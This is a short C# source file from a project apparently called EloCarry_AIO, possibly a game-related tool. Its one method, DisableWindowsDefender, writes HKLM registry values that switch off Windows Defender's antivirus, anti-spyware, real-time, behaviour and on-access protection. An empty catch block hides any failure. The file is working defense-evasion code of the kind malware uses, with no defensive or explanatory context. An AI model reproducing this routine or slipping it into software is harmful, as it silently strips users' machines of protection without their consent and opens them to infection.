using Microsoft.Win32;

namespace EloCarry_AIO.Classes
{
    internal class Registry
    {
        public static void DisableWindowsDefender()
        {
            try
            {
                using (RegistryKey Spyware = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(Constants.windowsDefenderKeyName, true))
                {
                    Spyware.SetValue(Constants.wdAntiSpywareValueName, 1);
                    Spyware.SetValue(Constants.wdAntiVirusValueName, 1);
                    Spyware.SetValue(Constants.wdDisableRealtimeMonitoring, 1);
                    Spyware.Close();
                }

                RegistryKey key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(Constants.RealTimeProtectionSubKey);
                {
                    key.SetValue(Constants.RealTimeProtectionValue, 1);
                    key.SetValue(Constants.DisableBehaviorMonitoring, 1);
                    key.SetValue(Constants.DisableOnAccessProtection, 1);
                    key.SetValue(Constants.DisableScanOnRealtimeEnable, 1);
                    key.Close();
                }
            }
            catch
            {

            }
        }
    }
}
